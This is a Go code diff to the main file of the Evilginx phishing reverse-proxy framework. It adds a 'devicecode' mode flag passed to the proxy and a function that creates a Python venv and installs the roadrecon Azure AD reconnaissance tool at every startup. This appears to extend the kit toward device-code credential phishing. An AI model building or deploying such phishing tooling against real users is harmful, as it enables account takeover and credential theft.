@@ -6,6 +6,7 @@ import (
 	_log "log"
 	"os"
 	"os/user"
+	"os/exec"
 	"path/filepath"
 	"regexp"
 
@@ -24,6 +25,7 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var devicecode_mode = flag.Bool("devicecode", false, "Enable devicecode mode")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -51,6 +53,47 @@ func showEvilginxMasteryAd() {
 	log.Info("%s", message)
 }
 
+func installRoadrecon() {
+
+	venvDir := "venv"
+	python := "venv/bin/python"
+
+	// 1. Check if venv exists — if not, create it
+	if _, err := os.Stat(python); os.IsNotExist(err) {
+		fmt.Println("Virtual environment not found — creating...")
+		cmd := exec.Command("python3", "-m", "venv", venvDir)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Run(); err != nil {
+			log.Fatal("Failed to create venv: %v", err)
+		}
+	}
+
+	// 2. Check if createCode is installed inside the venv
+	fmt.Println("Checking if 'roadrecon' is installed...")
+	cmd := exec.Command(python, "-m", "pip", "show", "roadrecon")
+	if err := cmd.Run(); err != nil {
+		fmt.Println("'roadrecon' not found — installing...")
+		cmd := exec.Command(python, "-m", "pip", "install", "--upgrade", "pip", "-q")
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Run(); err != nil {
+			log.Fatal("Failed to upgrade pip: %v", err)
+		}
+
+		cmd = exec.Command(python, "-m", "pip", "install", "roadrecon", "-q")
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Run(); err != nil {
+			log.Fatal("Failed to install roadrecon: %v", err)
+		}
+	} else {
+		fmt.Println("'roadrecon' is already installed.")
+	}
+
+}
+
+
 func main() {
 	flag.Parse()
 
@@ -62,9 +105,13 @@ func main() {
 	exe_path, _ := os.Executable()
 	exe_dir := filepath.Dir(exe_path)
 
+
+
 	core.Banner()
 	showEvilginxProAd()
 	showEvilginxMasteryAd()
+
+	installRoadrecon()
 
 	_log.SetOutput(log.NullLogger().Writer())
 	certmagic.Default.Logger = zap.NewNop()
@@ -178,8 +225,10 @@ func main() {
 		log.Fatal("certdb: %v", err)
 		return
 	}
-
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	if *devicecode_mode {
+		log.Info("Devicecode mode enabled")
+	}
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *devicecode_mode)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
